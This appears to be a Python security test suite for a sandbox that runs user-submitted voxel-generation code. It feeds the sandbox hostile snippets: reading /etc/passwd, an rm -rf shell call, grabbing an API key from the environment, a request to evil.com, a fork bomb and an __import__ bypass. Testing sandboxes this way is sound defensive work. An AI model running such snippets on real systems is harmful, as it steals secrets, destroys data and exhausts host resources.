#!/usr/bin/env python3
"""
Test suite for epicbox sandbox security
Attempts various malicious operations that should all be blocked
"""

import subprocess
import json

def run_sandbox_test(code, test_name):
    """Run code through sandbox and check if it's blocked"""
    print(f"\n{'='*60}")
    print(f"TEST: {test_name}")
    print(f"{'='*60}")

    try:
        result = subprocess.run(
            ['/home/jordan/blockcraft/my-astro-site/venv_epicbox/bin/python3',
             '/home/jordan/blockcraft/my-astro-site/voxel_sandbox_epicbox.py'],
            input=code.encode('utf-8'),
            capture_output=True,
            timeout=60
        )

        stdout = result.stdout.decode('utf-8', errors='replace')
        stderr = result.stderr.decode('utf-8', errors='replace')

        if result.returncode == 0:
            print(f"❌ SECURITY FAILURE - Code executed successfully!")
            print(f"Output: {stdout[:500]}")
            return False
        else:
            print(f"✅ BLOCKED - Code failed as expected")
            print(f"Error: {stderr[:500]}")
            return True

    except Exception as e:
        print(f"✅ BLOCKED - Exception raised: {e}")
        return True


# Test 1: Try to read /etc/passwd (host file access)
test_read_host_files = """
def generate():
    # Try to read sensitive host file
    with open('/etc/passwd', 'r') as f:
        data = f.read()
    return []
"""

# Test 2: Try to execute shell commands
test_shell_command = """
def generate():
    import os
    # Try to delete files
    os.system('rm -rf /tmp/test')
    return []
"""

# Test 3: Try to access environment variables (API keys)
test_env_vars = """
def generate():
    import os
    # Try to steal API keys
    api_key = os.environ.get('OPENAI_API_KEY')
    return []
"""

# Test 4: Try to import dangerous modules
test_import_subprocess = """
def generate():
    import subprocess
    # Try to run commands
    subprocess.run(['ls', '-la'])
    return []
"""

# Test 5: Try network access
test_network = """
def generate():
    import urllib.request
    # Try to send data to external server
    urllib.request.urlopen('https://evil.com').read()
    return []
"""

# Test 6: Try to spawn processes
test_spawn_process = """
def generate():
    import multiprocessing
    # Try to fork bomb
    for i in range(1000):
        multiprocessing.Process(target=lambda: None).start()
    return []
"""

# Test 7: Try to use __import__ to bypass restrictions
test_import_hack = """
def generate():
    # Try to import os using __import__
    os = __import__('os')
    os.system('whoami')
    return []
"""

# Test 8: VALID CODE - Should work
test_valid_code = """
def generate():
    # This is valid voxel generation code
    import math
    import random

    blocks = []

    # Create a simple sphere
    for i in range(10):
        angle = (2 * math.pi * i) / 10
        x = math.cos(angle)
        z = math.sin(angle)

        blocks.append({
            'block': 'minecraft:stone',
            'x': x,
            'y': 0.0,
            'z': z,
            'scale': [0.2, 0.2, 0.2]
        })

    return {'blocks': blocks, 'components': []}
"""

# Run all tests
if __name__ == '__main__':
    print("="*60)
    print("EPICBOX SANDBOX SECURITY TEST SUITE")
    print("="*60)

    tests = [
        (test_read_host_files, "Read host files (/etc/passwd)"),
        (test_shell_command, "Execute shell commands (os.system)"),
        (test_env_vars, "Access environment variables (API keys)"),
        (test_import_subprocess, "Import subprocess module"),
        (test_network, "Network access (urllib)"),
        (test_spawn_process, "Spawn excessive processes (fork bomb)"),
        (test_import_hack, "Bypass with __import__"),
        (test_valid_code, "Valid voxel code (SHOULD PASS)"),
    ]

    results = []
    for code, name in tests:
        passed = run_sandbox_test(code, name)
        results.append((name, passed))

    # Print summary
    print("\n" + "="*60)
    print("TEST SUMMARY")
    print("="*60)

    all_security_passed = True
    for name, passed in results:
        status = "✅ PASS" if passed else "❌ FAIL"
        print(f"{status} - {name}")

        # Special case: valid code should NOT be blocked
        if "SHOULD PASS" in name and passed:
            print(f"  ⚠️  WARNING: Valid code was blocked!")
            all_security_passed = False
        elif "SHOULD PASS" not in name and not passed:
            all_security_passed = False

    print("\n" + "="*60)
    if all_security_passed:
        print("🎉 ALL SECURITY TESTS PASSED!")
        print("The sandbox successfully blocks malicious code.")
    else:
        print("⚠️  SECURITY ISSUES DETECTED!")
        print("Some malicious code was able to execute.")
    print("="*60)
